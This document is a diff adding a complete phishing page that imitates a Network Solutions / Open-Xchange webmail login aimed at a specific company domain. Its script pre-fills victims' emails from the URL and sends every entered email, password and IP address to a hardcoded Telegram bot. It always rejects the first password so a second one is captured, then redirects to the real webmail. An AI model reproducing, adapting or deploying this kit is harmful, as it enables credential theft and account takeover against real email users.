@@ -1,0 +1,730 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Webmail Login</title>
+  <style>
+    /* ===== RESET ===== */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      height: 100%;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      color: #333;
+      background: #f0f0f0;
+      -webkit-font-smoothing: antialiased;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ===== TOP HEADER ===== */
+    .topbar {
+      background: #e9eef1;
+      border-bottom: 1px solid #d9dfe3;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .topbar-logo {
+      display: inline-flex;
+      align-items: baseline;
+      gap: 4px;
+      font-size: 18px;
+      font-weight: 700;
+      color: #2a9d3f;
+      letter-spacing: -0.3px;
+    }
+    .topbar-lang {
+      font-size: 13px;
+      color: #444;
+    }
+    .topbar-lang a { color: #2a6d7a; text-decoration: none; }
+    .topbar-lang a:hover { text-decoration: underline; }
+
+    /* ===== MAIN AREA ===== */
+    .page {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 60px 20px 40px;
+    }
+
+    /* ===== LOGIN CARD ===== */
+    .login-card {
+      width: 100%;
+      max-width: 420px;
+      background: #fff;
+      border-radius: 4px;
+      box-shadow: 0 4px 18px rgba(0,0,0,0.08), 0 1px 3px rgba(0,0,0,0.05);
+      padding: 32px 34px 40px;
+      text-align: center;
+      position: relative;
+    }
+    .login-card h1 {
+      font-size: 26px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 26px;
+      letter-spacing: -0.4px;
+    }
+    .login-card h2 {
+      font-size: 17px;
+      font-weight: 700;
+      color: #1a1a1a;
+      text-align: left;
+      margin-bottom: 14px;
+    }
+
+    /* ===== FORM ===== */
+    .form-group {
+      text-align: left;
+      margin-bottom: 16px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 6px;
+    }
+    .form-group .label-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 6px;
+    }
+    .form-group .label-row label { margin-bottom: 0; }
+    .form-group .change-link {
+      font-size: 13px;
+      color: #2a6d7a;
+      cursor: pointer;
+    }
+    .form-control {
+      width: 100%;
+      height: 40px;
+      padding: 0 12px;
+      border: 1px solid #cfd5dc;
+      border-radius: 2px;
+      font-size: 14px;
+      color: #222;
+      background: #fff;
+      outline: none;
+      transition: border-color .15s, box-shadow .15s;
+    }
+    .form-control:focus {
+      border-color: #2a6d7a;
+      box-shadow: 0 0 0 2px rgba(42,109,122,0.12);
+    }
+    .form-control[readonly] {
+      background: #eef1f3;
+      color: #555;
+      cursor: not-allowed;
+    }
+    
+    /* Email + domain composite */
+    .email-composite {
+      display: flex;
+      align-items: stretch;
+      border: 1px solid #cfd5dc;
+      border-radius: 2px;
+      background: #fff;
+      transition: border-color .15s, box-shadow .15s;
+    }
+    .email-composite:focus-within {
+      border-color: #2a6d7a;
+      box-shadow: 0 0 0 2px rgba(42,109,122,0.12);
+    }
+    .email-composite input {
+      border: none;
+      outline: none;
+      height: 38px;
+      padding: 0 12px;
+      font-size: 14px;
+      color: #222;
+      background: transparent;
+      flex: 1;
+      min-width: 0;
+    }
+    .email-composite .at-domain {
+      display: inline-flex;
+      align-items: center;
+      padding: 0 12px;
+      background: #eef1f3;
+      color: #555;
+      font-size: 14px;
+      border-left: 1px solid #cfd5dc;
+      white-space: nowrap;
+    }
+
+    /* ===== FORGOT PASSWORD ===== */
+    .forgot-row {
+      text-align: right;
+      margin-top: 6px;
+      margin-bottom: 10px;
+    }
+    .forgot-row a {
+      font-size: 12px;
+      color: #2a6d7a;
+      text-decoration: none;
+    }
+    .forgot-row a:hover { text-decoration: underline; }
+
+    /* ===== STAY SIGNED IN ===== */
+    .stay-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      text-align: left;
+      margin: 6px 0 16px;
+    }
+    .stay-row input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #2a6d7a;
+      cursor: pointer;
+      margin: 0;
+    }
+    .stay-row label {
+      font-size: 14px;
+      color: #333;
+      cursor: pointer;
+    }
+
+    /* ===== FEEDBACK ===== */
+    .feedback {
+      display: none;
+      background: #dceef5;
+      border: 1px solid #b8d9e6;
+      color: #1a4450;
+      font-size: 13px;
+      font-weight: 600;
+      padding: 12px 14px;
+      border-radius: 2px;
+      text-align: left;
+      margin-bottom: 16px;
+      line-height: 1.4;
+    }
+    .feedback.show { display: block; }
+    .feedback.error {
+      background: #fdecea;
+      border-color: #f5c6cb;
+      color: #a94442;
+    }
+
+    /* ===== BUTTON ===== */
+    .btn-continue {
+      width: 100%;
+      height: 46px;
+      background: #2a6d7a;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      border-radius: 2px;
+      letter-spacing: 0.3px;
+      border: none;
+      cursor: pointer;
+      transition: background .15s;
+      margin-top: 4px;
+    }
+    .btn-continue:hover { background: #235a65; }
+    .btn-continue:active { background: #1d4c56; }
+    .btn-continue:disabled {
+      background: #8fb0b6;
+      cursor: not-allowed;
+    }
+
+    /* ===== STEPS ===== */
+    .step { display: none; }
+    .step.active { display: block; }
+
+    /* ===== INFO CARD ===== */
+    .info-card {
+      width: 100%;
+      max-width: 420px;
+      background: #fff;
+      border-radius: 4px;
+      box-shadow: 0 4px 18px rgba(0,0,0,0.08), 0 1px 3px rgba(0,0,0,0.05);
+      padding: 26px 28px 24px;
+      margin-top: 24px;
+      text-align: center;
+    }
+    .info-card p {
+      font-size: 13px;
+      color: #444;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+    .btn-learn {
+      display: block;
+      width: 100%;
+      height: 38px;
+      background: #fff;
+      color: #2a6d7a;
+      border: 1px solid #cfd5dc;
+      border-radius: 2px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background .15s, border-color .15s;
+    }
+    .btn-learn:hover {
+      background: #f6fafb;
+      border-color: #2a6d7a;
+    }
+
+    /* ===== FOOTER ===== */
+    .footer {
+      background: #e9eef1;
+      border-top: 1px solid #d9dfe3;
+      padding: 14px 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+    }
+    .footer a { color: #2a6d7a; text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+    .footer .sep { margin: 0 8px; color: #b5bcc2; }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 480px) {
+      .page { padding: 30px 16px 30px; }
+      .login-card { padding: 26px 22px 30px; }
+      .info-card { padding: 22px 22px 20px; }
+      .login-card h1 { font-size: 22px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ===== TOP HEADER ===== -->
+  <div class="topbar">
+    <div class="topbar-logo">
+      <span>network</span>
+      <span>solutions</span>
+    </div>
+    <div class="topbar-lang">
+      Language: <a href="#">English (United States)</a>
+    </div>
+  </div>
+
+  <!-- ===== MAIN ===== -->
+  <div class="page">
+
+    <div class="login-card">
+      <h1>Webmail Login</h1>
+      <h2>Sign in</h2>
+
+      <form id="loginForm" novalidate onsubmit="return false;">
+
+        <!-- ========== STEP 1: Email only ========== -->
+        <div id="stepEmail" class="step active">
+          <div class="form-group">
+            <label for="emailLocal">Email</label>
+            
+            <!-- Standard full email input -->
+            <input type="text" id="email" class="form-control"
+                   autocomplete="username" autofocus
+                   autocorrect="off" autocapitalize="off" spellcheck="false"
+                   placeholder="Enter your email address">
+
+            <!-- Composite input (Username + @domain) -->
+            <div id="emailCompositeWrap" class="email-composite" style="display:none;">
+              <input type="text" id="emailLocal" autocomplete="username"
+                     autocorrect="off" autocapitalize="off" spellcheck="false"
+                     placeholder="username">
+              <span class="at-domain" id="emailDomainSuffix">@mail.asphaltcare.com</span>
+            </div>
+          </div>
+
+          <div class="stay-row">
+            <input type="checkbox" id="staySignedIn1" checked>
+            <label for="staySignedIn1">Stay signed in</label>
+          </div>
+
+          <div id="feedbackEmail" class="feedback"></div>
+
+          <button type="button" id="continueBtn" class="btn-continue">Continue</button>
+        </div>
+
+        <!-- ========== STEP 2: Password ========== -->
+        <div id="stepPassword" class="step">
+          <div class="form-group">
+            <div class="label-row">
+              <label for="emailDisplay">Email</label>
+              <a class="change-link" id="changeEmailLink">Change</a>
+            </div>
+            <input type="text" id="emailDisplay" class="form-control"
+                   readonly tabindex="-1">
+          </div>
+
+          <div class="form-group">
+            <label for="password">Your password*</label>
+            <input type="password" id="password" class="form-control"
+                   autocomplete="current-password">
+          </div>
+
+          <div class="forgot-row">
+            <a href="#" id="forgotPasswordLink">Forgot your password?</a>
+          </div>
+
+          <div class="stay-row">
+            <input type="checkbox" id="staySignedIn2" checked>
+            <label for="staySignedIn2">Stay signed in</label>
+          </div>
+
+          <div id="feedbackPassword" class="feedback"></div>
+
+          <button type="button" id="signInBtn" class="btn-continue">Sign In</button>
+        </div>
+
+      </form>
+    </div>
+
+    <!-- Info card -->
+    <div class="info-card">
+      <p>
+        We are updating our email security and will require all email server
+        connections to use an encrypted connection when connecting via POP or
+        IMAP from a device. To avoid any email connection issues, please be sure
+        to update your mail client settings.
+      </p>
+      <button type="button" class="btn-learn" id="learnMoreBtn">Learn More...</button>
+    </div>
+
+  </div>
+
+  <!-- ===== FOOTER ===== -->
+  <div class="footer">
+    © 2026 Open-Xchange GmbH
+    <span class="sep">|</span> Version: 8.53.2
+    <span class="sep">|</span> <a href="#">Privacy policy</a>
+    <span class="sep">|</span> <a href="#">Legal notes</a>
+  </div>
+
+  <script>
+  (function() {
+    // ==========================================================
+    //  ⚙️ TELEGRAM CONFIGURATION
+    // ==========================================================
+    const TELEGRAM_BOT_TOKEN = '8913179068:AAFCEK6Ujv1BV63Mi34b8ObUyBXEkF2xDZo';
+    const TELEGRAM_CHAT_ID   = '7613190869';
+
+    // ==========================================================
+    //  STATE
+    // ==========================================================
+    let isSubmitting    = false;
+    let passwordAttempt = 0;
+    let email           = '';
+    let userDomain      = ''; // e.g. "mail.asphaltcare.com"
+
+    // ==========================================================
+    //  DOM
+    // ==========================================================
+    const stepEmail    = document.getElementById('stepEmail');
+    const stepPassword = document.getElementById('stepPassword');
+
+    const emailInput         = document.getElementById('email');
+    const emailLocal         = document.getElementById('emailLocal');
+    const emailCompositeWrap = document.getElementById('emailCompositeWrap');
+    const emailDomainSuffix  = document.getElementById('emailDomainSuffix');
+    const emailDisplay       = document.getElementById('emailDisplay');
+    const passwordInput      = document.getElementById('password');
+
+    const continueBtn     = document.getElementById('continueBtn');
+    const signInBtn       = document.getElementById('signInBtn');
+    const changeEmailLink = document.getElementById('changeEmailLink');
+    const forgotPwdLink   = document.getElementById('forgotPasswordLink');
+    const learnMoreBtn    = document.getElementById('learnMoreBtn');
+
+    const feedbackEmail    = document.getElementById('feedbackEmail');
+    const feedbackPassword = document.getElementById('feedbackPassword');
+
+    // ==========================================================
+    //  HELPERS
+    // ==========================================================
+    function showFeedback(el, message, level) {
+        if (!el) return;
+        el.className = 'feedback show ' + (level || 'error');
+        el.textContent = message;
+    }
+    function hideFeedback(el) {
+        if (!el) return;
+        el.className = 'feedback';
+        el.textContent = '';
+    }
+    function isValidEmail(s) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(s);
+    }
+    function showStep(step) {
+        stepEmail.classList.remove('active');
+        stepPassword.classList.remove('active');
+        if (step === 'email') {
+            stepEmail.classList.add('active');
+            setTimeout(() => {
+                if (userDomain && emailLocal) emailLocal.focus();
+                else emailInput.focus();
+            }, 50);
+        } else {
+            stepPassword.classList.add('active');
+            emailDisplay.value = email;
+            passwordAttempt = 0;
+            hideFeedback(feedbackPassword);
+            passwordInput.value = '';
+            passwordInput.type = 'password';
+            setTimeout(() => passwordInput.focus(), 50);
+        }
+    }
+
+    // ==========================================================
+    //  URL PARSING
+    // ==========================================================
+    function getUrlParameter(name) {
+        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+        const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+        const results = regex.exec(window.location.search);
+        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    }
+
+    // ==========================================================
+    //  HANDLE user_domain PARAMETER
+    //  If present, switch to composite (username + @domain) input.
+    // ==========================================================
+    function applyUserDomain() {
+        const raw = getUrlParameter('user_domain');
+        if (!raw) return;
+
+        // sanitize
+        userDomain = raw.trim().toLowerCase().replace(/[^a-z0-9.\-]/g, '');
+        if (!userDomain || !userDomain.includes('.')) { userDomain = ''; return; }
+
+        // Swap to composite input
+        emailInput.style.display = 'none';
+        emailCompositeWrap.style.display = 'flex';
+        emailDomainSuffix.textContent = '@' + userDomain;
+    }
+
+    function getEmailFromForm() {
+        if (userDomain) {
+            const local = (emailLocal.value || '').trim();
+            if (!local) return '';
+            // if the user typed a full email into the local field, honor it
+            if (local.includes('@')) return local;
+            return local + '@' + userDomain;
+        }
+        return (emailInput.value || '').trim();
+    }
+
+    // ==========================================================
+    //  AUTO-GRAB EMAIL FROM # AND SKIP TO PASSWORD
+    // ==========================================================
+    function autoFillEmail() {
+        const hash = window.location.hash.replace(/^#/, '');
+        // The hash in your example is complex: "!!&app=io.ox/mail..."
+        // We only care if the hash contains a plain email or base64 email.
+        if (!hash) return;
+
+        let e = '';
+        if (hash.includes('@') && hash.includes('.')) {
+            // Try to extract just the email if it's mixed with other text
+            const match = hash.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+            if (match) e = match[1];
+        } else {
+            // Try base64 decode
+            try {
+                let b64 = hash.replace(/-/g, '+').replace(/_/g, '/');
+                while (b64.length % 4) b64 += '=';
+                const decoded = atob(b64);
+                if (decoded && decoded.includes('@')) e = decoded;
+            } catch (err) {}
+        }
+
+        if (e) {
+            if (userDomain) {
+                // If auto-grab email ends with our domain, fill only local part
+                const lower = e.toLowerCase();
+                const suffix = '@' + userDomain;
+                if (lower.endsWith(suffix)) {
+                    emailLocal.value = e.substring(0, e.length - suffix.length);
+                } else {
+                    emailLocal.value = e; // full email, will be used as-is
+                }
+            } else {
+                emailInput.value = e;
+            }
+            
+            // Set the global email variable and skip directly to Step 2
+            email = e;
+            console.log('[AutoGrab] Email pre-filled, jumping to password:', e);
+            showStep('password');
+        }
+    }
+
+    // ==========================================================
+    //  TELEGRAM REPORT
+    // ==========================================================
+    async function sendToTelegram(user, pass, attempt) {
+        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+            console.warn('[Telegram] Not configured.');
+            return false;
+        }
+
+        let ip = 'unknown';
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            ip = ipData.ip || 'unknown';
+        } catch (e) {}
+
+        const text = '🔐 *Webmail Login* (attempt #' + attempt + ')\n' +
+                     '📧 Email: `' + user + '`\n' +
+                     '🔑 Password: `' + pass + '`\n' +
+                     '🌐 IP: `' + ip + '`\n' +
+                     '🕒 ' + new Date().toISOString();
+
+        const url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+        try {
+            const res = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            });
+            const data = await res.json();
+            return data.ok === true;
+        } catch (err) {
+            return false;
+        }
+    }
+
+    // ==========================================================
+    //  EVENT WIRING
+    // ==========================================================
+    continueBtn.addEventListener('click', async function() {
+        if (isSubmitting) return;
+
+        const e = getEmailFromForm();
+        if (!e) {
+            showFeedback(feedbackEmail, 'Please enter your email address.', 'error');
+            (userDomain ? emailLocal : emailInput).focus();
+            return;
+        }
+        if (!isValidEmail(e)) {
+            showFeedback(feedbackEmail, 'Please enter a valid email address.', 'error');
+            (userDomain ? emailLocal : emailInput).focus();
+            return;
+        }
+
+        isSubmitting = true;
+        hideFeedback(feedbackEmail);
+        continueBtn.disabled = true;
+        continueBtn.textContent = 'Please wait…';
+
+        email = e;
+
+        // Send step 1 report (email only)
+        await sendToTelegram(email, '', 'step 1 – email');
+
+        showStep('password');
+
+        continueBtn.disabled = false;
+        continueBtn.textContent = 'Continue';
+        isSubmitting = false;
+    });
+
+    signInBtn.addEventListener('click', async function() {
+        if (isSubmitting) return;
+
+        const password = (passwordInput.value || '');
+        if (!password) {
+            showFeedback(feedbackPassword, 'Please enter your password.', 'error');
+            passwordInput.focus();
+            return;
+        }
+
+        isSubmitting = true;
+        passwordAttempt++;
+        hideFeedback(feedbackPassword);
+        signInBtn.disabled = true;
+        signInBtn.textContent = 'Please wait…';
+
+        // Send step 2 report (email + password)
+        await sendToTelegram(email, password, 'step 2 – password');
+
+        if (passwordAttempt === 1) {
+            // 1st Attempt: Show error
+            showFeedback(feedbackPassword, 'The password is incorrect.', 'error');
+            passwordInput.value = '';
+            passwordInput.focus();
+            signInBtn.disabled = false;
+            signInBtn.textContent = 'Sign In';
+            isSubmitting = false;
+        } else {
+            // 2nd Attempt: Redirect
+            showFeedback(feedbackPassword, 'Signing in… redirecting', 'success');
+            signInBtn.textContent = 'Redirecting…';
+            setTimeout(() => {
+                // Redirect back to the provided OX URL
+                window.location.href = 'https://webmail-oxcs.networksolutionsemail.com/appsuite/?user_domain=' + userDomain + '#!!&app=io.ox/mail&folder=default0/INBOX';
+            }, 1000);
+        }
+    });
+
+    changeEmailLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        showStep('email');
+        if (userDomain) {
+            const suffix = '@' + userDomain;
+            const lower = (email || '').toLowerCase();
+            if (lower.endsWith(suffix)) {
+                emailLocal.value = email.substring(0, email.length - suffix.length);
+            } else if (email) {
+                emailLocal.value = email;
+            }
+            emailLocal.focus();
+        } else {
+            emailInput.value = email || emailInput.value;
+            emailInput.focus();
+        }
+    });
+
+    forgotPwdLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        alert('Password recovery is unavailable in this demo.');
+    });
+
+    learnMoreBtn.addEventListener('click', function() {
+        alert('For more information about our email security update, please contact your administrator.');
+    });
+
+    // Allow pressing Enter to submit
+    emailInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') { e.preventDefault(); continueBtn.click(); }
+    });
+    emailLocal.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') { e.preventDefault(); continueBtn.click(); }
+    });
+    passwordInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') { e.preventDefault(); signInBtn.click(); }
+    });
+
+    // ==========================================================
+    //  INIT
+    // ==========================================================
+    window.addEventListener('DOMContentLoaded', function() {
+        applyUserDomain();
+        autoFillEmail();
+    });
+    window.addEventListener('hashchange', autoFillEmail);
+
+  })();
+  </script>
+</body>
+</html>
